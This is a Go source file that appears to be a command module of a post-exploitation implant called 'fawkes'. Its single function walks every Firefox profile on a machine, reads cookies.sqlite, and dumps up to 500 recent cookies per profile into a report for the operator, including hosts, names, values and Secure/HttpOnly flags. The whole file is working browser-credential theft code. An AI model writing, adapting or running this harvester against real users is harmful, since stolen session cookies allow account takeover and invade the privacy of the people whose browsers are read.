package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// browserFirefoxCookies extracts cookies from Firefox's cookies.sqlite (plaintext, no encryption).
// This works on all platforms since Firefox doesn't encrypt cookie values.
func browserFirefoxCookies(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type cookieEntry struct {
		Browser    string
		Host       string
		Name       string
		Value      string
		Path       string
		Expiry     string
		IsSecure   bool
		IsHTTPOnly bool
	}

	var allEntries []cookieEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if !isFirefoxBrowser(browserName) {
			continue
		}
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		profiles := findFirefoxProfiles(userDataDir)
		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "cookies.sqlite")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies ORDER BY lastAccessed DESC LIMIT 500")
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var host, name, value, path string
				var expiry int64
				var isSecure, isHTTPOnly int

				if err := rows.Scan(&host, &name, &value, &path, &expiry, &isSecure, &isHTTPOnly); err != nil {
					continue
				}

				allEntries = append(allEntries, cookieEntry{
					Browser:    label,
					Host:       host,
					Name:       name,
					Value:      truncStr(value, 100),
					Path:       path,
					Expiry:     firefoxTimeToString(expiry * 1000000), // expiry is in seconds
					IsSecure:   isSecure != 0,
					IsHTTPOnly: isHTTPOnly != 0,
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Firefox Cookies (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		flags := ""
		if e.IsSecure {
			flags += " [Secure]"
		}
		if e.IsHTTPOnly {
			flags += " [HttpOnly]"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s: %s = %s  (path: %s, expires: %s)%s\n",
			e.Browser, e.Host, e.Name, e.Value, e.Path, e.Expiry, flags))
	}

	if len(allEntries) == 0 {
		sb.WriteString("No Firefox cookies found.\n")
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}
